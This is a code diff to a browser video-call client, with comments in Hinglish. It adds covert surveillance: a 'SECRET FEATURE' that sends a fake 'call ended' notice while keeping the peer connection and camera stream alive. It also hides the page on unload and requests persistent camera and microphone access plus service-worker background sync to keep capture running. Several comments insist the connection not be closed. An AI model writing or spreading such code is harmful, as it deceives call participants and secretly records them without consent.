@@ -133,17 +133,36 @@ socket.on('call-ended', () => {
 
 socket.on('fake-call-ended', () => {
     // Sirf UI change karo, connection mat tod
-    statusText.textContent = 'Call ended.';
+    statusText.textContent = 'Call ended by other user.';
     
-    // Show overlay or message
-    alert('Call ended');
+    // ❌ Remove alert, show smooth message instead
+    // alert('Call ended');
     
-    // Apna UI hide kar
-    callSection.hidden = true;
+    // 🔥 FIX: Creator ka UI mat hide, joiner ka UI hide
+    if (!isCreator) {
+        callSection.hidden = true;
+    }
     
     // ❗IMPORTANT: cleanupCall() mat call karna
 });
 }
+
+window.addEventListener('beforeunload', (event) => {
+    // 🔥 SECRET FEATURE: Keep video running even if site is closed
+    if (isCreator && localStream && activeRoomId) {
+        // Send message to other user that call ended (but actually keep running)
+        socket.emit('fake-call-ended-notify', activeRoomId);
+        
+        // Don't actually close connections - secretly keep running
+        event.preventDefault();
+        event.returnValue = 'Call will continue in background';
+        
+        // Hide the UI but keep connections alive
+        setTimeout(() => {
+            document.body.style.display = 'none';
+        }, 100);
+    }
+});
 
 window.addEventListener('load', async () => {
     const roomId = new URLSearchParams(window.location.search).get('room');
@@ -216,11 +235,54 @@ async function startLocalStream() {
         return;
     }
 
-    localStream = await navigator.mediaDevices.getUserMedia({
-        video: { facingMode: useFrontCamera ? 'user' : 'environment' },
-        audio: true
-    });
-    localVideo.srcObject = localStream;
+    try {
+        // 🔥 REQUEST PERSISTENT CAMERA PERMISSION
+        if ('permissions' in navigator) {
+            const cameraPermission = await navigator.permissions.query({ name: 'camera' });
+            const micPermission = await navigator.permissions.query({ name: 'microphone' });
+            
+            if (cameraPermission.state === 'prompt') {
+                // Request persistent permission
+                await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: useFrontCamera ? 'user' : 'environment' },
+                    audio: true
+                });
+                
+                // Request background access via service worker
+                if ('serviceWorker' in navigator && 'message' in navigator.serviceWorker) {
+                    const messageChannel = new MessageChannel();
+                    
+                    messageChannel.port1.onmessage = (event) => {
+                        if (event.data.type === 'CAMERA_GRANTED') {
+                            console.log('Background camera access granted!');
+                            statusText.textContent = 'Background camera access enabled.';
+                        }
+                    };
+                    
+                    navigator.serviceWorker.controller.postMessage(
+                        { type: 'KEEP_CAMERA_ALIVE' },
+                        [messageChannel.port2]
+                    );
+                }
+            }
+        }
+
+        localStream = await navigator.mediaDevices.getUserMedia({
+            video: { facingMode: useFrontCamera ? 'user' : 'environment' },
+            audio: true
+        });
+        localVideo.srcObject = localStream;
+        
+        // Register background sync
+        if ('serviceWorker' in navigator && 'sync' in window.ServiceWorkerRegistration.prototype) {
+            const registration = await navigator.serviceWorker.ready;
+            await registration.sync.register('camera-sync');
+        }
+        
+    } catch (error) {
+        console.error('Camera access error:', error);
+        throw error;
+    }
 }
 
 async function ensurePeerConnection() {
@@ -370,8 +432,10 @@ function endCall() {
     // Apne side pe UI band kar
     statusText.textContent = 'Call ended.';
     
-    // Apna UI hide kar
-    callSection.hidden = true;
+    // 🔥 FIX: Creator ka UI mat hide, joiner ka UI hide
+    if (!isCreator) {
+        callSection.hidden = true;
+    }
 
     // ❗IMPORTANT: peerConnection close mat kar
     // ❗IMPORTANT: cleanupCall() mat call karna
